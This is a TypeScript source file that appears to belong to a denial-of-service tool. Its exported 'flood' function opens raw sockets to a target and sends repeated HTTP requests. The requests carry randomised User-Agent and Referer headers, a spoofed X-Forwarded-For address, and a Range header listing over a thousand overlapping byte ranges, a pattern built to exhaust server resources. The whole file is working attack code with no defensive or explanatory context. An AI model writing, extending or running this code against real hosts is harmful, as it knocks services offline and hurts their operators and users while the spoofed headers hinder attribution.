import * as net from "net"
import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

function parseUrl(url: string): { host: string; port: number; path: string } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 80,
    path: u.pathname || "/",
  }
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port, path } = parseUrl(url)
  const ranges = Array.from({ length: 1024 }, (_, i) => `5-${i}`).join(",")
  const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomChoice(USER_AGENTS)}\r\nReferer: ${randomChoice(REFERERS)}\r\nX-Forwarded-For: ${randIp()}\r\nRange: bytes=0-,${ranges}\r\nConnection: keep-alive\r\n\r\n`

  const payloadBytes = Buffer.byteLength(payload)
  const run = () => {
    return new Promise<void>((resolve) => {
      const sock = net.createConnection({ host, port }, () => {
        for (let i = 0; i < rpc; i++) {
          sock.write(payload)
          onStats(1, payloadBytes)
        }
        sock.end()
        resolve()
      })
      sock.on("error", () => resolve())
      sock.setTimeout(3000, () => {
        sock.destroy()
        resolve()
      })
    })
  }

  await run()
}
